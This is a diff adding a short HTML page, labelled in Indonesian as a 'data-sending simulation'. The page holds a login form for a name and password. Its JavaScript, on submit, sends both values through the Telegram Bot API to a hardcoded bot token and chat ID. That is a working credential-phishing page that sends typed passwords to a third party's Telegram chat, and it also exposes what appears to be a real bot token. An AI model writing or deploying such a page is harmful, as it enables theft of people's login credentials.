@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Simulasi Kirim Data</title>
+</head>
+<body>
+
+<h2>Form Simulasi</h2>
+
+<form id="formLogin">
+    <input type="text" id="nama" placeholder="Masukkan nama"><br><br>
+    <input type="password" id="password" placeholder="Masukkan password"><br><br>
+    <button type="submit">Kirim</button>
+</form>
+
+<script>
+document.getElementById("formLogin").addEventListener("submit", function(e){
+    e.preventDefault();
+
+    var nama = document.getElementById("nama").value;
+    var password = document.getElementById("password").value;
+
+    var token = "8588288437:AAF55Cst6oQzNmm8qlFfM1fij_J2UgUJVSQ";  // ganti dengan token
+    var chat_id = "8465582504"; // ganti dengan chat_id kamu
+
+    var pesan = "Simulasi Data:\nNama: " + nama + "\nPassword: " + password;
+
+    var url = "https://api.telegram.org/bot" + token +
+              "/sendMessage?chat_id=" + chat_id +
+              "&text=" + encodeURIComponent(pesan);
+
+    fetch(url)
+    .then(response => response.json())
+    .then(data => {
+        alert("Data terkirim!");
+    })
+    .catch(error => {
+        alert("Gagal mengirim!");
+    });
+});
+</script>
+
+</body>
+</html>
